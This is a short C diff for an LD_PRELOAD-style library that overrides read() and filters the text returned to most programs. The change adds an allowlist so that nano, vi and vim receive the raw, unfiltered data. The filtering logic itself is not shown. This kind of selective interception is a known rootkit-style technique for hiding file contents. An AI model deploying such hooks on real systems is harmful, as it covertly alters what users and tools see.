@@ -4,8 +4,19 @@
 #include <dlfcn.h> 
 
 ssize_t read(int fd, void *buf, size_t count) {
-    ssize_t (*real_read)(int, void *, size_t) = dlsym(RTLD_NEXT, "read");
-    ssize_t result = real_read(fd, buf, count);
+    static ssize_t (*orig)(int, void*, size_t) = NULL;
+    if (!orig) orig = dlsym(RTLD_NEXT, "read");
+
+    // ALLOWLIST: If the program is nano, vi, or vim, bypass the text filtering
+    if (program_invocation_short_name && (
+        strcmp(program_invocation_short_name, "nano") == 0 ||
+        strcmp(program_invocation_short_name, "vi") == 0 ||
+        strcmp(program_invocation_short_name, "vim") == 0)) {
+        
+        return orig(fd, buf, count); // Show the raw text strings normally
+    }
+
+    ssize_t result = orig(fd, buf, count);
 
     if (result > 0) {
         char *match;
@@ -31,3 +42,4 @@ ssize_t read(int fd, void *buf, size_t count) {
     }
     return result;
 }
+
